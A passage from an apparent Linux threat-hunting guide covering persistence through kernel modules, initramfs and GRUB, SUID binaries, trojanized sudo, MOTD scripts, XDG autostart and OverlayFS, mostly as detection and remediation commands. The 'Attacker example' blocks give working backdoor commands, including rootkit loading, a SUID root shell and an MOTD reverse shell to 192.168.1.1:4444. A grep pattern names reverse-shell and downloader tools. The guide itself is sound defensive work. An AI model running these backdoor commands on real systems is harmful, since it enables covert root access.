# Remove from boot-time auto-load lists
sed -i '/^<module_name>/d' /etc/modules 2>/dev/null
rm /etc/modules-load.d/<module_name>.conf 2>/dev/null

# Remove on-disk module artifact and rebuild dependencies
rm /lib/modules/$(uname -r)/kernel/drivers/misc/<module_name>.ko 2>/dev/null
depmod -a

# (Optional) tighten modprobe configuration by removing malicious aliases/blacklists
sed -i '/<module_name>/d' /etc/modprobe.d/*.conf 2>/dev/null
```

Package integrity and boot chain:

```bash
# Verify kernel-related packages (Debian/Ubuntu)
debsums -c 2>/dev/null | grep -iE 'linux-image|linux-modules|kernel'

# Map /lib/modules to owning packages
dpkg -S /lib/modules/$(uname -r) 2>/dev/null | head -20

# Verify kernel package (RHEL/CentOS)
rpm -V kernel 2>/dev/null || echo "Kernel package verification failed or not found"
```

If rootkit-like behavior or heavy tampering is suspected, plan for a full kernel and module package reinstall, initramfs rebuild and potentially a host rebuild.

### Attacker example

```bash
# Load a malicious kernel module (LKM rootkit)
insmod /tmp/rootkit.ko

# Configure persistent auto-load at boot (Debian-style)
echo "rootkit" >> /etc/modules
cp /tmp/rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/misc/
depmod -a

# Example: check if module signature enforcement is disabled
cat /sys/module/module/parameters/sig_enforce 2>/dev/null || echo "[!] Module signature enforcement: disabled or not present"

# List module signer information (unsigned/out-of-tree modules stand out)
for mod in $(lsmod | awk 'NR>1 {print $1}'); do
  modinfo "$mod" 2>/dev/null | grep -iE 'signer|signature'
done
```

Kernel-module rootkits loaded this way (MITRE ATT&CK T1547.006) can hide their own presence, conceal processes and sockets and tamper with logs, making them extremely difficult to spot from userspace alone.

---

## Boot chain & initramfs persistence

### Primary location

| Path / Surface                                  | Description                                                    |
|-------------------------------------------------|----------------------------------------------------------------|
| `/boot/`                                        | Kernel images, initramfs and bootloader configuration         |
| `/boot/grub/grub.cfg`, `/etc/grub.d/*`          | GRUB bootloader configuration scripts and final menu           |
| `/etc/initramfs-tools/` (Debian/Ubuntu)         | initramfs build configuration and hooks                        |
| `/etc/dracut.conf.d/*.conf` (RHEL/CentOS)       | Dracut initramfs build configs and module lists                |
| `/boot/initrd.img-$(uname -r)` / `initramfs-*`  | Actual initramfs images used at boot                           |

### Detection

> Goal: identify tampered kernel/boot configuration and malicious scripts inside initramfs that can load LKMs or early-root payloads.

```bash
# Overview of boot files
ls -lah /boot/

# Inspect GRUB configuration for unusual kernel/initrd entries or boot arguments
grep -iE 'linux|initrd' /boot/grub/grub.cfg 2>/dev/null

# Hash kernel and initramfs images for comparison against baselines
sha256sum /boot/vmlinuz-* /boot/initrd.img-* 2>/dev/null

# Enumerate GRUB scripts and check for unexpected custom entries
find /etc/grub.d -type f -ls 2>/dev/null
```

Initramfs contents:

```bash
# Extract current initramfs into a temp directory and search for scripts
mkdir /tmp/initrd_check
cd /tmp/initrd_check

unmkinitramfs /boot/initrd.img-$(uname -r) . 2>/dev/null || \
  (cp /boot/initrd.img-$(uname -r) initrd.gz && gunzip initrd.gz && cpio -id < initrd)

# Look for shell/Python scripts (possible custom boot-time logic)
find . \( -name "*.sh" -o -name "*.py" \) 2>/dev/null

cd / && rm -rf /tmp/initrd_check

# Initramfs build configuration
find /etc/initramfs-tools /etc/dracut.conf.d -type f -ls 2>/dev/null
```

Logs and taint (early hints of boot-chain tampering):

```bash
# Kernel messages around boot, module loads and taint
dmesg -T | grep -iE 'module|taint|secure boot|lockdown' 2>/dev/null

# Persistent kernel logs (where available)
journalctl -k --since "1 hour ago" 2>/dev/null
```

What to look for:

- Extra GRUB entries pointing to unexpected kernel or initramfs images.  
- Initramfs scripts that:
  - Insert LKMs (`insmod`, `modprobe`) from unusual paths.  
  - Launch shell or network tools early in boot.  
- Changes in initramfs build configs (`/etc/initramfs-tools/hooks`, `/etc/dracut.conf.d`) referencing attacker-controlled modules or binaries.  
- Kernel image or initramfs hashes that differ from trusted baselines or package contents. 

### Remediation

> Before modifying the boot chain, capture copies of `/boot/*`, `/boot/grub/grub.cfg`, initramfs build configs and any suspicious scripts for later analysis.  

```bash
# Restore clean initramfs and kernel configs (Debian/Ubuntu)
update-initramfs -u -k all

# Rebuild initramfs on RHEL/CentOS
dracut --force

# Rebuild GRUB configuration
update-grub                     # Debian/Ubuntu
grub2-mkconfig -o /boot/grub2/grub.cfg   # RHEL/CentOS

# Remove malicious or unapproved GRUB scripts
rm /etc/grub.d/99-malicious 2>/dev/null
update-grub
```

If tampering is extensive (unknown kernel image, heavily modified initramfs), plan for a full kernel package reinstall and careful offline validation before rebooting in production.  

### Attacker example

```bash
# LKM rootkit made persistent via initramfs hook (Debian-style example)
cat << 'EOF' > /etc/initramfs-tools/scripts/init-top/rootkit-load
#!/bin/sh
PREREQ=""
. /scripts/functions
# Load rootkit early in boot
modprobe rootkit || insmod /lib/modules/$(uname -r)/kernel/drivers/misc/rootkit.ko
EOF
chmod +x /etc/initramfs-tools/scripts/init-top/rootkit-load
update-initramfs -u -k $(uname -r)

# GRUB entry pointing to attacker-controlled kernel/initramfs
cat << 'EOF' > /etc/grub.d/42-rootkit
#!/bin/sh
cat << 'EOM'
menuentry 'Linux Rootkit Kernel' {
    linux   /boot/vmlinuz-rootkit root=/dev/sda1 ro quiet
    initrd  /boot/initrd-rootkit.img
}
EOM
EOF
chmod +x /etc/grub.d/42-rootkit
update-grub
```

By using kernel modules and boot-chain hooks (T1547.006), attackers gain persistence that starts before most defenses and can systematically hide their activity from user-space detection. 

---

# SUID, SGID and Binary replacement

## Why it matters

SUID and SGID bits allow executables to run with the privileges of the file owner or group, rather than the invoking user; when the owner is root, any user executing an SUID root binary gains root-level privileges for that program. 
Attackers abuse these elevation mechanisms to create backdoor SUID shells, misconfigure legitimate tools, or replace trusted binaries, gaining a reliable path back to privileged access even after passwords or keys are rotated.

Typical abuse patterns:

- Creation of new SUID or SGID backdoor binaries (often shells or GTFOBins-capable utilities). 
- Setting SUID/SGID bits on legitimate but powerful executables (e.g. `find`, `vim`, `bash`).  
- Binary replacement of trusted tools (`sudo`, `su`, `ssh`) with trojanized versions that maintain persistence or log credentials.  
- Abuse of Linux file capabilities (`setcap`) to grant specific high-value privileges (e.g. `cap_setuid`, `cap_net_raw`) as a stealthier alternative to SUID.

---

## SUID and SGID backdoor binaries

### Primary location

| Path / Surface                          | Description                                                         |
|----------------------------------------|---------------------------------------------------------------------|
| `/bin`, `/usr/bin`, `/usr/sbin`, `/sbin` | Normal locations of privileged system executables; SUID expected on a limited set of binaries (`sudo`, `passwd`, etc.) |
| `/tmp`, `/var/tmp`, `/dev/shm`         | User-writable locations; SUID/SGID binaries here are almost always malicious or misconfigured |
| `/home/*`                              | User directories; SUID/SGID binaries owned by root in these paths are strong post-compromise indicators |
| Entire filesystem (`/`)                | Full SUID/SGID sweep needed to catch backdoors in non-standard locations |

### Detection

> Goal: enumerate all SUID/SGID binaries, compare against package-managed expectations and highlight backdoor shells or misconfigured elevation points.

```bash
# All SUID binaries on the system (root-owned elevation surface)
find / -type f -perm -4000 2>/dev/null | sort | tee /tmp/suid_current.txt

# All SGID binaries
find / -type f -perm -2000 2>/dev/null | sort

# SUID/SGID audit with full details (inode, perms, owner, path)
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null | sort -k11

# Shells with SUID (should never exist on a clean system)
find / -type f -perm -4000 \( -name "bash" -o -name "sh" -o -name "zsh" \) 2>/dev/null

# SUID/SGID binaries on local filesystems only, with metadata
find / -xdev -type f -perm /6000 -ls 2>/dev/null
```

Baseline comparison (Debian):

```bash
# Expected SUID from packages vs current SUID list (Debian/Ubuntu)
dpkg --get-selections | awk '{print $1}' | xargs dpkg -L 2>/dev/null \
  | xargs -I{} stat -c "%a %n" {} 2>/dev/null \
  | awk '$1~/[1][0-9][0-9][0-9]/{print}' > /tmp/suid_expected.txt

diff /tmp/suid_expected.txt /tmp/suid_current.txt
```

Integrity and replacement:

```bash
# Binaries replaced or modified after install (Debian)
debsums -c 2>/dev/null

# RPM-based systems: MD5 mismatch indicates modification
rpm -Va 2>/dev/null | grep "^..5"

# Hash check on critical elevation binaries
sha256sum /usr/bin/sudo /usr/bin/su /usr/bin/ssh /bin/bash /usr/bin/passwd

# Metadata for critical binaries
stat /usr/bin/sudo /usr/bin/su /usr/bin/ssh /bin/bash /usr/bin/passwd 2>/dev/null
```

Capabilities (SUID-adjacent elevation):

```bash
# SUID binaries that also have file capabilities (double elevation surface)
find / -xdev -type f -perm -4000 -exec getcap -n {} \; 2>/dev/null

# Global capability audit
getcap -r / 2>/dev/null
```

What to look for:

- SUID root binaries in `/tmp`, `/var/tmp`, `/dev/shm`, or user home directories. 
- Shells (`bash`, `sh`, `zsh`) with the SUID bit set, or other GTFOBins-capable utilities elevated unexpectedly.  
- Differences between `/tmp/suid_expected.txt` and `/tmp/suid_current.txt` indicating extra or missing SUID binaries.  
- Package integrity failures (`debsums` / `rpm -Va`) on privileged binaries (`sudo`, `su`, `passwd`).  

### Remediation

> Preserve evidence first: copy suspicious SUID/SGID binaries, record ownership, permissions, hashes and package metadata before changing anything.

```bash
# Remove SUID from a suspicious binary
chmod u-s /tmp/.bash

# Remove SGID if needed
chmod g-s /tmp/.binary

# Remove capabilities from a suspicious binary (if present)
setcap -r /tmp/.binary

# Delete clearly malicious SUID backdoor
rm -f /tmp/.bash

# Reinstall package for replaced critical binary (example: sudo)
apt-get install --reinstall sudo        # Debian/Ubuntu
yum reinstall sudo                      # RHEL/CentOS

# Verify after reinstall
sha256sum /usr/bin/sudo
dpkg --verify sudo 2>/dev/null || rpm -V sudo 2>/dev/null
```

### Attacker example

```bash
# Create a SUID bash copy that any user can use to get root
cp /bin/bash /tmp/.bash
chown root:root /tmp/.bash
chmod 4755 /tmp/.bash    # or: chmod u+s /tmp/.bash

# Usage: drops into a root shell
/tmp/.bash -p
```

Attackers can equally set the SUID bit on legitimate GTFOBins-capable utilities (`find`, `vim`) to gain flexible root shells or arbitrary file access.

---

## Binary replacement & file capabilities persistence

### Primary location

| Path / Surface                               | Description                                                                |
|----------------------------------------------|----------------------------------------------------------------------------|
| `/bin`, `/usr/bin`, `/usr/sbin`, `/sbin`    | Primary locations of system binaries (sudo, su, ssh, shell, package tools) |
| `/lib`, `/lib64`, `/usr/lib`                | Shared libraries used by privileged binaries                               |
| `/usr/local/bin`, `/usr/local/sbin`         | Locally managed executables; frequent target for trojaned tools            |
| Package logs and metadata                    | `/var/log/dpkg.log`, `/var/log/apt/history.log`, `/var/log/yum.log`; DPkg/RPM databases |
| File capabilities store (xattrs)             | `security.capability` extended attributes attached via `setcap`            |

### Detection

> Goal: identify binaries and libraries that have been replaced, diverted, or granted unexpected capabilities, enabling stealthy persistence and elevation.

Integrity and modification:

```bash
# Debian: verify changed or missing package files
debsums -ca 2>/dev/null

# RPM-based: verify packages and spot modifications
rpm -Va 2>/dev/null

# Recently modified binaries in core system directories
find /bin /usr/bin /usr/sbin /sbin -newer /etc/os-release -type f -ls 2>/dev/null

# Recently modified libraries in system paths
find /lib /lib64 /usr/lib -newer /etc/os-release -type f -name '*.so*' -ls 2>/dev/null
```

Diversions and ownership:

```bash
# Debian diversions – binaries redirected away from package defaults
dpkg-divert --list 2>/dev/null

# Check package ownership of critical binaries
dpkg -S /usr/bin/sudo /usr/bin/su /usr/bin/ssh /bin/bash /usr/bin/passwd 2>/dev/null
rpm -qf /usr/bin/sudo /usr/bin/su /usr/bin/ssh /bin/bash /usr/bin/passwd 2>/dev/null
```

Capabilities as persistence:

```bash
# Global capability scan – unexpected file capabilities are high-value findings
getcap -r / 2>/dev/null

# Inspect capabilities on a suspicious binary
getcap /usr/local/bin/webd 2>/dev/null
```

What to look for:

- Critical binaries (`sudo`, `su`, `ssh`, shells) with hashes or metadata that differ from vendor baselines, or not owned by expected packages. 
- Locally managed binaries in `/usr/local/bin` or `/opt` with powerful capabilities (`cap_setuid`, `cap_sys_admin`, `cap_net_raw`). 
- DPkg diversions or RPM anomalies where trusted paths point to non-standard implementations.  

### Remediation

> As with SUID, keep forensic copies and hashes of any suspicious binaries before replacement.  

```bash
# Remove capabilities from a suspicious binary
setcap -r /usr/local/bin/webd

# Restore replaced system binaries via package reinstall
apt-get install --reinstall sudo passwd openssh-client openssh-server  # Debian/Ubuntu example
yum reinstall sudo passwd openssh                                    # RHEL/CentOS example

# Rebuild any necessary caches
ldconfig

# Tighten permissions on local executable paths
chmod 755 /usr/local/bin /usr/local/sbin
chown root:root /usr/local/bin /usr/local/sbin
```

Validation:

```bash
# Re-run integrity checks and ensure no unexpected SUID/capabilities remain
debsums -ca 2>/dev/null | grep -v "OK"
rpm -Va 2>/dev/null | grep "^..5"

# Audit SUID shells again
find / -xdev -type f -perm -4000 \( -name "bash" -o -name "sh" -o -name "zsh" \) 2>/dev/null

# Audit capabilities again
getcap -r / 2>/dev/null
```

### Attacker example

```bash
# Trojanize sudo by binary replacement
cp /usr/bin/sudo /usr/bin/sudo.bak
cp /tmp/sudo_backdoor /usr/bin/sudo
chown root:root /usr/bin/sudo
chmod 4755 /usr/bin/sudo

# Grant setuid capability instead of SUID bit on a local helper (stealthier on some audits)
setcap cap_setuid+ep /usr/local/bin/helper
getcap /usr/local/bin/helper
```

By combining SUID/SGID abuse (T1548.001) with binary replacement and file capabilities, attackers can establish durable elevation paths that blend into normal system administration unless you continuously audit privileged binaries against a known-good baseline.

---

# MOTD Persistence

## Why it matters

On many Linux distributions, scripts in `/etc/update-motd.d/` are executed as root at every interactive login via `pam_motd.so`, before the user’s shell is started. 
Attackers can embed long-running or background payloads into these scripts; because they fork away from the login chain, resulting processes typically have `PPID=1` and can be overlooked in routine process reviews.
MOTD persistence is part of the broader “login-triggered execution” family: every SSH or console login automatically provides a trusted, root-context execution opportunity unless you inspect these scripts carefully. 

---

## MOTD script-based persistence

### Primary location

| Path                     | Description                                                                                   |
|--------------------------|-----------------------------------------------------------------------------------------------|
| `/etc/update-motd.d/`   | Executable scripts run as root at interactive login (numbered, lexicographic order)           |
| `/etc/pam.d/sshd`       | PAM stack for SSH; `pam_motd.so` here enables MOTD script execution for SSH sessions           |
| `/etc/pam.d/login`      | PAM stack for console logins; `pam_motd.so` enables MOTD on local TTY logins                  |
| `/etc/ssh/sshd_config`  | `PrintMotd` / `Banner` / `ForceCommand` control MOTD and related login messaging (SSH server) |

### Detection

> Goal: identify malicious or modified MOTD scripts, confirm that `pam_motd.so` is active and link suspicious scripts to orphaned processes.

```bash
# List all MOTD scripts with permissions, owners and timestamps
ls -lah /etc/update-motd.d/

# MOTD scripts – check metadata and first ~200 lines of content
find /etc/update-motd.d -type f -ls -exec sed -n '1,200p' {} \; 2>/dev/null

# Hunt for common persistence payload patterns in MOTD scripts
grep -rE "nohup|/dev/tcp|bash -i|nc |curl|wget|base64" \
  /etc/update-motd.d/ 2>/dev/null

# Verify pam_motd is configured for SSH and console logins
grep "pam_motd" /etc/pam.d/sshd /etc/pam.d/login 2>/dev/null

# Global PAM search for pam_motd usage
grep -RIn 'pam_motd' /etc/pam.d 2>/dev/null

# SSH configuration related to MOTD / banners / forced commands
grep -RInE 'PrintMotd|Banner|ForceCommand' /etc/ssh 2>/dev/null

# Check for orphaned processes spawned at login time (PPID=1 but non-root users)
ps -eo pid,ppid,user,lstart,cmd | awk '$2==1 && $3!="root"' | head -20

# Other login-triggered scripts (profile.d) that may complement MOTD persistence
find /etc/profile.d -type f -ls 2>/dev/null
```

What to look for:

- New or recently modified scripts under `/etc/update-motd.d/` containing:
  - Reverse shells (`/dev/tcp`, `bash -i`, `nc`).  
  - Download-and-execute logic (`curl`, `wget`, `base64` decode).  
  - Long-running background commands (`nohup`, infinite loops).  
- `pam_motd.so` entries in SSH and login PAM stacks that point to unexpected MOTD configuration.  
- Processes with `PPID=1` launched around login times whose command lines match payloads found in MOTD scripts. 

### Remediation

> Preserve evidence first: copy suspicious MOTD scripts, PAM configs and related logs before making changes. 

```bash
# Remove a malicious MOTD script
rm /etc/update-motd.d/99-update

# Manually review remaining MOTD scripts for hidden payloads
for f in /etc/update-motd.d/*; do
  echo "=== $f ==="
  cat "$f"
done

# (Optional) remove pam_motd from SSH PAM stack if you decide to disable MOTD scripts there
sed -i '/pam_motd/d' /etc/pam.d/sshd

# Test SSH before closing your only privileged session
ssh -v localhost
```

Guidance:

- Delete clearly malicious scripts; for legitimate scripts containing questionable logic, consider rewriting or hardening them.  
- If MOTD scripts aren’t required operationally, you can disable `pam_motd.so` for SSH while keeping console MOTD if needed.  

### Attacker example

```bash
# Add a reverse shell launched from a new MOTD script – runs as root on every SSH login
cat > /etc/update-motd.d/99-update << 'EOF'
#!/bin/bash
nohup bash -c 'bash -i >/dev/tcp/192.168.1.1/4444 0<&1 2>&1' &
EOF
chmod +x /etc/update-motd.d/99-update
```

This backdoor leverages PAM-driven MOTD execution so that each interactive login silently spawns a root-owned reverse shell process detached from the user’s session, making it harder to correlate with the originating SSH connection.

---

# Desktop and XDG Autostart persistence

## Why it matters

On Linux systems running a graphical desktop, XDG autostart `.desktop` entries are executed automatically when a user logs into their desktop environment, providing a built‑in mechanism for boot/logon autostart execution. 
Adversaries abuse these entries by inserting or modifying `.desktop` files so their payload runs on every GUI login, especially on workstations and developer machines where desktop sessions are common.

---

## XDG Autostart Entries

### Primary locations

| Path                              | Scope / Notes                                        |
|-----------------------------------|------------------------------------------------------|
| `~/.config/autostart/`           | Per‑user autostart (user‑writable, highest risk)     |
| `~/.local/share/autostart/`      | Alternative per‑user autostart path                  |
| `/etc/xdg/autostart/`            | System‑wide autostart (root‑managed)                 |
| `/usr/share/autostart/`          | Package‑installed autostart entries                  |
| `~/.config/autostart-scripts/`   | KDE‑specific user autostart scripts                  |

### Detection

> Objective: find suspicious `.desktop` entries and `Exec=` targets that run at desktop login, especially from non‑standard or user‑writable paths.

```bash
# Enumerate XDG autostart files (system‑wide and per‑user)
find /etc/xdg/autostart /usr/share/autostart /home /root \
  -type f \( -path '*/.config/autostart/*' \
          -o -path '*/.local/share/autostart/*' \
          -o -path '*/autostart-scripts/*' \) \
  -ls 2>/dev/null
```

- Review ownership, permissions and timestamps to spot newly added or modified autostart entries in user homes and `/etc/xdg/autostart/`. 

```bash
# Inspect Exec= targets for all autostart entries
grep -rE "^Exec=" /etc/xdg/autostart/ /home/*/.config/autostart/ 2>/dev/null
```

- Focus on `Exec=` lines pointing to unusual binaries or scripts (hidden paths, interpreters, reverse shells, downloaders).  

```bash
# Exec from non‑standard or user‑writable locations
grep -rE "Exec=.*(\/tmp|\/dev\/shm|\/home.*\.cache|\/var\/tmp)" \
  /etc/xdg/autostart/ /home/*/.config/autostart/ 2>/dev/null
```

- Entries that execute from `/tmp`, `/dev/shm`, cache directories, or other ephemeral locations are strong persistence candidates.

```bash
# Hidden .desktop files under home directories
find /home -name ".*.desktop" 2>/dev/null
```

- Hidden `.desktop` files can be used to avoid casual inspection in GUI file managers.  

```bash
# Root or service account autostart (unusual for desktop)
ls /root/.config/autostart/ 2>/dev/null

# Full directive inspection for context
grep -RInE '^(Exec|TryExec|Hidden|OnlyShowIn|NotShowIn)=' \
  /etc/xdg/autostart /usr/share/autostart \
  /home/*/.config/autostart /root/.config/autostart 2>/dev/null
```

- Check `Hidden=`, `OnlyShowIn` and `NotShowIn` to see if an attacker is trying to restrict visibility or target specific desktop environments. 

### Remediation

> Objective: remove malicious autostart entries and their payloads, while preserving evidence and not breaking legitimate desktop behaviour.

```bash
# Remove malicious user‑scope autostart entry
rm ~/.config/autostart/malicious.desktop

# Remove malicious system‑wide autostart entry
rm /etc/xdg/autostart/malicious.desktop
```

- Before deletion, copy suspicious `.desktop` files to an evidence directory and record hashes, owners and permissions.  

```bash
# Confirm and remove the referenced payload if needed
grep "Exec=" ~/.config/autostart/suspicious.desktop
rm <binary_path_from_exec>
```

- Ensure that any binary or script referenced by a malicious `Exec=` line is removed or quarantined after you’ve captured forensic copies.  

Post‑remediation check:

```bash
# Verify that malicious autostart entries are gone
find /home -name "*.desktop" \
  -exec grep -l "Exec=.*\/tmp\|Exec=.*\/dev\/shm" {} \; 2>/dev/null
```

- Expect no remaining `.desktop` files whose `Exec=` points into `/tmp`, `/dev/shm`, or other attacker‑favoured writable paths.  

### Attacker example

```bash
# User‑level autostart backdoor – runs on every GUI login
cat > ~/.config/autostart/update.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=System Update
Exec=/tmp/.update-agent --daemon
Hidden=false
X-GNOME-Autostart-enabled=true
EOF

chmod 700 ~/.config/autostart/update.desktop
```

This `.desktop` entry blends in under a plausible name (“System Update”) and ensures `/tmp/.update-agent` starts automatically whenever the user logs into their desktop session, without requiring root for persistence. 

---

# OverlayFS and Filesystem Persistence

### Why it matters

OverlayFS is a union filesystem that merges a read‑only lower layer with a writable upper layer into a single merged view: objects in the upper layer override objects in the lower layer. 
Attackers can mount OverlayFS over core system paths (for example `/usr/bin`, `/var/log`) and place modified binaries or logs in the upper layer, so integrity checks on the original paths still pass while all running processes see the attacker‑controlled view. 
If the overlay mount is added to `/etc/fstab` or a boot script, this behaviour persists across reboots and can hide or replace artifacts in ways that defeat naïve file‑based triage.

| Path / Surface                     | Description                                                                 |
|-----------------------------------|-----------------------------------------------------------------------------|
| `findmnt -t overlay` / `/proc/mounts` | Shows active OverlayFS mountpoints, including `lowerdir`, `upperdir`, `workdir` |
| `lowerdir=`                       | Read‑only base; usually legitimate system or container image               |
| `upperdir=`                       | Writable layer; attacker modifications live here                           |
| `workdir=`                        | Internal metadata; must be on same filesystem as `upperdir`               |
| `/etc/fstab`                      | Persistent overlay entries mounted at boot                                 |
| Typical legit roots               | `/var/lib/docker`, `/var/lib/containerd`, `/run/*` (container and runtime overlays) |

**Overlay architecture:**

```
lowerdir/  (read-only — legit system files)    ← originals untouched
upperdir/  (read-write — attacker modifications) ← malicious files live here
workdir/   (internal metadata — must be same FS as upper)
     │
     ▼
merged/    (what processes see — upper overrides lower)
```

**Whiteout files:** When a file in `lowerdir` is "deleted" via the overlay, OverlayFS creates a `.wh.<filename>` marker in `upperdir` to hide it from the merged view. These are key forensic indicators.

**Think of it like this**:
        
- /lower (clean OS)`lowerdir=` → base (usually legit)
- /upper `upperdir=` → **where modifications are stored (critical)**
- → /merged (what processes see) `workdir=` → internal overlay metadata

`overlay on /path type overlay (rw,lowerdir=...,upperdir=...,workdir=...)`

If a file exists in `/upper`, it *overrides* the same file in `/lower`.

**Why attackers love it**:

- No need to modify original system files
- Persistence survives reboots if remounted
- Harder to detect with basic file integrity tools
- Can “hide” malicious binaries by masking legit ones

### Detection

**Find mounts with suspicious** `upperdir=` or `workdir=` paths
  - Overlay mounted outside normal locations (`/var/lib/docker`, `/run`, `/var/lib/containers`)
  - Weird paths used as upperdir like `/tmp`, `/dev/shm`, `/home/user/.cache`, `/var/tmp`, (`.something`) hidden directories
  - Recently created directories `find / -type d -name "*overlay*" 2>/dev/null`
  - Overlay mounted over critical paths (lower dir) like: `/bin`, `/usr`, `/lib`, `/etc`
**Check active processes with overlay path**
- `ps auxf` show process tree
    - `readlink -f /proc/1234/exe` check the related executable used by a specific process (change 1234 with the actual PID)
- `lsof | grep overlay` list open files
- `fuser -vm /suspicious/mountpoint` identify processes using files or sockets

```bash
# List all active overlay mounts
findmnt | grep overlay
cat /proc/mounts | grep overlay
cat /proc/self/mounts | grep overlay

# Check for suspicious upperdir/workdir paths
# Legitimate overlays: /var/lib/docker/..., /var/lib/containerd/..., /run/...
# Suspicious: /tmp, /dev/shm, /home/*/.cache, /var/tmp, hidden directories
findmnt -t overlay -o TARGET,OPTIONS | grep -vE "docker|containerd|run"

# Find recently created directories with "overlay" in the name
find / -type d -name "*overlay*" -newer /etc/passwd 2>/dev/null

# Check if critical system paths are overlay-mounted
for path in /bin /usr/bin /lib /usr/lib /etc /sbin /var/log; do
  findmnt "$path" 2>/dev/null | grep overlay && echo "WARNING: overlay on $path"
done
# Any overlay on `/usr/bin`, `/bin`, `/lib*`, `/etc` or `/var/log` warrants immediate investigation, as it can be used to mask binaries or logs.  

# Inspect the upperdir of suspicious mounts for modified files
# (extract upperdir path from findmnt output first)
ls -lahR /tmp/.x/                            # example suspicious upperdir
diff -rq /usr/bin /tmp/.x/usr/bin 2>/dev/null

# Check for whiteout files (hidden original files)
#In OverlayFS, when files are **overwritten** in the **upper directory**, OverlayFS **hides** the original files in the **lower directory** by creating **whiteout files**. A whiteout file is essentially a marker that tells OverlayFS to *ignore* the file in the lower directory when it is merged into the filesystem view.
#For example, if a file exists in both the upper and lower layers, OverlayFS will display the file from the **upper layer** and "hide" the one in the **lower layer**. To mark this, a **whiteout file** is created in the upper directory, which instructs the system to ignore the corresponding file in the lower directory.
find / -name ".wh.*" 2>/dev/null

# Processes using files from an overlay path
lsof | grep overlay
fuser -vm /suspicious/mountpoint 2>/dev/null

# Check /etc/fstab for persistent overlay mount entries
#The **`/etc/fstab`** file is responsible for defining filesystem mounts at boot time. If an attacker wants the overlay to mount automatically, they may add it to `/etc/fstab`
#If you find any **suspicious entries**, you can remove them by editing the file and restarting the system: `sudo nano /etc/fstab`
grep overlay /etc/fstab

# Mount namespace inspection (container or namespace-isolated overlay)
lsns -t mnt
nsenter -t <PID> -m mount | grep overlay    # inspect a process's mount namespace

# Verify hash of critical binaries in both real and overlay paths
sha256sum /usr/bin/sudo
sha256sum /tmp/.x/usr/bin/sudo 2>/dev/null   # compare if overlay exists
```

### Remediation

```bash
#### 1. Unmount the overlay from its target
# Unmount overlay from a critical path
umount /usr/bin      # or /var/log, /etc, etc.

# If multiple overlays are stacked on the same target (for example, two overlays both mounted on `/var/log`), unmounting removes only the topmost one; the previously hidden one becomes visible again. 

# Repeat if they are stacked
while findmnt /usr/bin | grep -q overlay; do umount /usr/bin; done

# Verify that no overlay remains
findmnt -t overlay | grep /var/log || echo "[OK] /var/log no longer overlaid"

#### 2. Remove persistent configuration and upperdir
# Remove suspicious overlay entries from /etc/fstab
sed -i '/overlay.*upperdir=\/tmp/d' /etc/fstab

# Remove malicious upperdir tree
rm -rf /tmp/.x/

#### 3. Restore and verify real binaries/logs
# Verify that real binaries are visible and intact
sha256sum /usr/bin/sudo
dpkg --verify sudo 2>/dev/null || rpm -V sudo 2>/dev/null

# Verify logs under /var/log are now the expected set
ls -la /var/log

#### 4. Kill processes still mapped to overlay content
# Identify processes that had overlay‑backed files
lsof | grep "overlay\|/tmp/.x" 2>/dev/null

# Kill affected processes after you’ve captured evidenc

kill -9 <affected_PIDs>
```

**Dealing with stacked overlays on the same target:**

When `findmnt | grep overlay` shows two mounts on the same target (e.g., both pointing to `/var/log`), only the last-mounted (topmost) one is visible. After `umount /var/log`, the previously hidden mount becomes visible again. Repeat until the target is clean.

```bash
# Check layers
findmnt | grep overlay | grep "/var/log"

# Peel off layers one by one
umount /var/log   # removes topmost
umount /var/log   # removes next layer if still overlaid
# Verify with: mount | grep "on /var/log"
```
Example of “malicious” overlay, where two overlay both points to /var/log

![image.png](img/remediation_overlay.png)

```jsx
overlay / overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/757/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/746/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/745/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/744/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/743/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/742/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/741/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/740/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/739/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/738/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/737/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/736/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/735/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/734/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/733/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/732/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/731/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/730/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/728/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/727/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/726/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/724/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/723/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/722/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/721/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/720/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/529/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/528/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/527/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/526/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/525/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/524/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/125/fs,upperdir=/var/lib/containerd/io.containerd.snap